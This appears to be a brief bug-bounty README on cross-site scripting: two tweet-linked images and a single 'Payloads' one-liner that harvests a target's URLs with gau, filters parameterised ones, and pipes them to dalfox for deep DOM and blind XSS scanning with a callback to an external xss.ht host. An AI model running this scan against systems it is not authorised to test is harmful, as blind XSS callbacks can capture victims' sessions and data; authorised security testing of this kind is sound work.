<h1 align="center">XSS --> Cross Site Scripting</h1>

<h3>1</h3>
<a href="https://twitter.com/404death/status/1464102960372224003"><img width="550" height="600px" align="center" src="https://user-images.githubusercontent.com/79082257/143777165-68df1dd0-a69a-4fcb-af8e-5fb7c96463f8.png"/></a>

<h3>2</h3>
<a href="https://twitter.com/0xElkomy/status/1467466221704847361"><img width="600" height="700px" align="center" src="https://user-images.githubusercontent.com/79082257/144747863-5c672808-727e-4ac2-a894-ce09966ea765.png"/></a>

Payloads
```
   cat Target.com | gau -subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind username.xss.ht
```
